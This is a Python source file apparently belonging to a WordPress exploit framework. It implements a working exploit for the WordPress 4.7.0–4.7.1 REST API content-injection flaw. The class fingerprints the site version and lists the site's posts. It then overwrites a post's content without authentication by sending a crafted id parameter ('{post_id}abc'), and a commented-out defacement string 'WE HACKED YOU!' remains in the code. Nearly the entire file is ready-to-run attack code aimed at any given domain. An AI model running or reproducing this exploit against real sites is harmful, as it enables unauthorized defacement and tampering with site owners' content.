# Nethanel Gelernter (c)
import json
import urllib.request
from lxml import etree

from wpdetector import WPDetector


class ContentInjectionExploit(object):

    def __init__(self, domain, additional_data=None, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficieny
        :param domain: string. the domain we are working on
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        """
        try:
            self._domain = domain
            detector = WPDetector(domain)
            self._version = detector.get_version()[1]
            self._vulnerable = self.is_vulnerable_version(self._version)
            if additional_data is None:
                self.post_id = self.get_posts(self.get_api_url(self._domain))
                #self._content = 'WE HACKED YOU!'
                self._content = 'HELLO_WORLD'
            else:
                self.post_id = additional_data[1]
                self._content = additional_data[2]
            self._proxies = proxies
        except Exception as e:
            print(e)

    def plugin_name(self):
        """
        :return: the vulnerable plugin's name
        """
        return 'Plugin not relevant for this exploit'

    def vulnerable_versions(self):
        """
        :return: string. the describes the ranges of vulnerable methods
        """
        return '4.7.0 - 4.7.1'

    def is_vulnerable_version(self, version_str):
        """
        :param version_str: X.Y.Z....
        :return:Boolean. Whether the version is vulnerable or not
        """
        try:
            version = version_str.split('.')
            if len(version) == 2:
                if version[0] == '4':
                    if version[1] == '7':
                        return True
            elif version[0] == '4':
                if version[1] == '7':
                    if version[2] == '0' or version[2] == '1':
                        return True
            return False
        except Exception as e:
            print(e)

    def get_references(self):
        """
        :return: list of URLs for data about the exploit & vulnerability (where did you find the data?)
        """
        return ['https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html',
                'https://www.twistlock.com/labs-blog/wordpress-4-7-04-7-1/']

    def is_vulnerable(self):
        """
        Test whether vulnerable or not. If many requests or suspicious requests might be sent, consider adding
        aggresive parameter
        :return: Boolean - whether domain is vulnerable or not
        """
        try:
            if self.is_vulnerable_version(self._version):
                return True
            return False
        except Exception as e:
            print(e)

    def get_api_url(self, domain):
        """
        This function checks if the permalink option is disabled
        A permalink is the web address used to link to your content. The URL to each post should be permanent and never change
        :param domain: string. the domain we are working on
        :return: element unicode result
        """
        try:
            response = urllib.request.urlopen('http://' + domain)
            data = etree.HTML(response.read())
            u = data.xpath('//link[@rel="https://api.w.org/"]/@href')[0]
            # check if we have permalinks
            if 'rest_route' in u:
                print(' ! Warning, looks like permalinks are not enabled. This might not work!')
            return u
        except:
            print('error in first exploit - get_api_url function')

    def get_posts(self, api_base):
        """
        This function gets all the posts from the domain
        :param api_base: element unicode result. the path of the api_url
        :return: int. the last id of the post
        """
        try:
            response = urllib.request.urlopen(api_base + 'wp/v2/posts')
            posts = json.loads(response.read())
            for post in posts:
                print(' - Post ID: {0}, Title: {1}, Url: {2}'
                      .format(post['id'], post['title']['rendered'], post['link']))
                id = post['id']
            return id
        except:
            print('error in first exploit - get_posts function')

    def update_post(self, api_base, post_id, post_content):
        """
        This function updates the post that we want to change
        :param api_base: element unicode result. the path of the api_url
        :param post_id: int. the id of the post we want to change
        :param post_content: the new content
        """
        # more than just the content field can be updated. see the api docs here:
        # https://developer.wordpress.org/rest-api/reference/posts/#update-a-post
        try:
            data = json.dumps({
                'content': post_content
            })
            url = api_base + 'wp/v2/posts/{post_id}/?id={post_id}abc'.format(post_id=post_id)
            req = urllib.request.Request(url)
            req.add_header('Content-Type', 'application/json; charset=utf-8')
            json_data_as_bytes = data.encode('utf-8')  # needs to be bytes
            req.add_header('Content-Length', json_data_as_bytes)
            response = urllib.request.urlopen(req, json_data_as_bytes).read()
            print('* Post updated. Check it out at {0}'.format(json.loads(response)['link']))
        except:
            print('error in first exploit - update_post function')

    def exploit(self):
        """
        If possible to exploit (E.g., in server-side vulns) - exploit
        In client-side, return the exploit code to use
        :return: Boolean - success or not
        """
        try:
            if self._vulnerable:
                api_url = self.get_api_url(self._domain)
                print('* Discovering API Endpoint')
                print('* API lives at: {0}'.format(api_url))
                '''print('* Updating post {0}'.format(self.post_id))'''
                print('* Updating post {0}'.format(self.post_id))
                self.update_post(api_url, self.post_id, ''.join(self._content))
                print('* Update complete!')
                return True
            else:
                print('This version is not vulnerable for this exploit')
                return False
        except Exception as e:
            print(e)
            return False
